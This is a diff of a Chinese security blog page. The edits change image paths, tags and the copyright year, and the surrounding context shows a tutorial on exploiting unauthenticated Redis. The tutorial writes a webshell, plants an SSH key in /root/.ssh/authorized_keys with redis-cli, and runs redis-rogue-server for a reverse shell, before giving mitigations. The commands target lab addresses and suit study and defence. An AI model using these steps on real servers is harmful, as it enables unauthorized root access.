@@ -10,8 +10,8 @@
     <meta property="og:type" content="article">
 
     
-    <meta property="og:image" content="https://littlebin404.github.io/img/main.jpg">
-    <meta property="twitter:image" content="https://littlebin404.github.io/img/main.jpg" />
+    <meta property="og:image" content="https://littlebin404.github.io/img/about/2.jpg">
+    <meta property="twitter:image" content="https://littlebin404.github.io/img/about/2.jpg" />
     
 
     
@@ -137,6 +137,10 @@
                             <a href="/categories/%E7%A5%9E%E5%85%B5%E5%88%A9%E5%99%A8">神兵利器</a>
                         </li>
                         
+                        <li>
+                            <a href="/categories/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97">红蓝对抗</a>
+                        </li>
+                        
                     
                     
 		    
@@ -189,7 +193,7 @@
 
 <style type="text/css">
     header.intro-header {
-        background-image: url('/img/main.jpg')
+        background-image: url('/img/about/2.jpg')
     }
 </style>
 <header class="intro-header">
@@ -209,7 +213,7 @@
                     <span class="meta">
                         Posted by 
                         
-                            littlebin404
+                            Littlebin404
                          
                         on 
                         Monday, January 27, 2020
@@ -307,42 +311,42 @@ if __name__ == '__main__':
     port=sys.argv[2]
     print check(ip,port, timeout=10)
 </code></pre><p><strong>脚本运行结果</strong>
-<img src="/img/r1.jpg" alt="screenshot"></p>
+<img src="/img/R/r1.jpg" alt="screenshot"></p>
 <p><strong>验证</strong></p>
 <p>从登录的结果可以看出该redis服务对公网开放，且未启用认证。
-<img src="/img/r2.jpg" alt="screenshot"></p>
+<img src="/img/R/r2.jpg" alt="screenshot"></p>
 <h2 id="漏洞利用复现">漏洞利用复现</h2>
 <h3 id="利用redis写webshell">利用redis写webshell</h3>
 <p>当redis权限不是root时，并开着web服务，在redis有web目录写权限时，可以尝试往web物理路径写webshell；存在<strong>ssrf</strong>漏洞的站点可以利用四个协议，分别是http、file、gopher（redis以root权限运行）、dict（一条一条的执行）协议。
-<img src="/img/r14.jpg" alt="screenshot"></p>
+<img src="/img/R/r14.jpg" alt="screenshot"></p>
 <p>使用浏览器访问redis-shell.php,验证是否写入成功:
-<img src="/img/r15.jpg" alt="screenshot"></p>
+<img src="/img/R/r15.jpg" alt="screenshot"></p>
 <h3 id="利用公私钥认证获取root权限">利用公私钥认证获取root权限</h3>
 <p>执行mkdir /root/.ssh命令，创建ssh公钥存放目录；生成ssh公钥和私钥，密码设置为空：
-<img src="/img/r6.jpg" alt="screenshot"></p>
+<img src="/img/R/r6.jpg" alt="screenshot"></p>
 <p>进入.ssh目录：cd .ssh/，将生成的公钥保存到1.txt：（<strong>前后用\n换行，避免和Redis里其他缓存数据混合</strong>）</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-toml" data-lang="toml"> (echo -e <span style="color:#f1fa8c">&#34;\n\n&#34;</span>; cat id_rsa.pub; echo -e <span style="color:#f1fa8c">&#34;\n\n&#34;</span>) &gt; <span style="color:#bd93f9">1</span>.txt
 </code></pre></div><p>将1.txt写入redis:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-toml" data-lang="toml">cat <span style="color:#bd93f9">1</span>.txt | redis-cli -h <span style="color:#bd93f9">192.168</span>.<span style="color:#bd93f9">114.128</span> -x set crack 
 </code></pre></div><p>登录靶机的redis服务，使用config get dir命令得到redis备份的路径：
-<img src="/img/r9.jpg" alt="screenshot"></p>
+<img src="/img/R/r9.jpg" alt="screenshot"></p>
 <p>更改redis备份路径为ssh公钥存放目录（一般默认为/root/.ssh）：
-<img src="/img/r10.jpg" alt="screenshot"></p>
+<img src="/img/R/r10.jpg" alt="screenshot"></p>
 <p>设置上传公钥的备份文件名字为authorized_keys：
-<img src="/img/r11.jpg" alt="screenshot"></p>
+<img src="/img/R/r11.jpg" alt="screenshot"></p>
 <p>检查是否更改成功（查看有没有authorized_keys文件），没有问题就保存然后退出，至此成功写入ssh公钥到靶机：
-<img src="/img/r12.jpg" alt="screenshot"></p>
+<img src="/img/R/r12.jpg" alt="screenshot"></p>
 <p>在攻击机使用ssh免密登录主机A：ssh -i id_rsa <a href="mailto:root@192.168.114.128">root@192.168.114.128</a>，成功登录：
-<img src="/img/r13.jpg" alt="screenshot"></p>
+<img src="/img/R/r13.jpg" alt="screenshot"></p>
 <h3 id="自动化rce脚本">自动化RCE脚本</h3>
 <p>github地址：(<a href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a>)
-<img src="/img/r3.jpg" alt="screenshot"></p>
+<img src="/img/R/r3.jpg" alt="screenshot"></p>
 <p>执行脚本：</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-toml" data-lang="toml">python3 redis-rogue-server.py --rhost <span style="color:#bd93f9">192.168</span>.<span style="color:#bd93f9">21.130</span> --lhost <span style="color:#bd93f9">192.168</span>.<span style="color:#bd93f9">21.34</span>
 </code></pre></div><p>分为Interactive shell和 Reverse shell，输入选项i，运行whoami：</p>
-<p><img src="/img/r4.jpg" alt="screenshot"></p>
+<p><img src="/img/R/r4.jpg" alt="screenshot"></p>
 <p>输入选项r，用nc监听返回的shell：
-<img src="/img/r5.jpg" alt="screenshot"></p>
+<img src="/img/R/r5.jpg" alt="screenshot"></p>
 <h3 id="解决方案">解决方案</h3>
 <p>1、比较安全的办法是采用redis.conf文件绑定IP的方式来进行控制：</p>
 <pre><code># If you want you can bind a single interface, if the bind option is not
@@ -351,11 +355,11 @@ if __name__ == '__main__':
 </code></pre><p>把# bind 127.0.0.1前面的注释#号去掉，把127.0.0.1改成你允许访问的ip地址，启动redis服务器的时候只能用: redis-server /etc/redis.conf,缺点为难免有多台机器访问一个redis服务。</p>
 <p>2、设置密码，以提供远程登陆
 打开redis.conf配置文件，找到requirepass，然后修改如下:
-<img src="/img/r16.jpg" alt="screenshot"></p>
+<img src="/img/R/r16.jpg" alt="screenshot"></p>
 <p>报错如下：
-<img src="/img/r17.jpg" alt="screenshot"></p>
+<img src="/img/R/r17.jpg" alt="screenshot"></p>
 <p>这时候用授权命令进行授权，就可以访问redis了：
-<img src="/img/r18.jpg" alt="screenshot"></p>
+<img src="/img/R/r18.jpg" alt="screenshot"></p>
 
 
                 
@@ -439,6 +443,12 @@ if __name__ == '__main__':
                         </a>
                         
                         
+                        
+                        <a href="/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97" title="红蓝对抗">
+                            红蓝对抗
+                        </a>
+                        
+                        
                     </div>
                 </section>
                 
@@ -512,7 +522,7 @@ if __name__ == '__main__':
             
                 </ul>
 		<p class="copyright text-muted">
-                    Copyright &copy; Littlebin404 Blog 2020
+                    Copyright &copy; Littlebin404 Blog 2021
                     
                     
                     
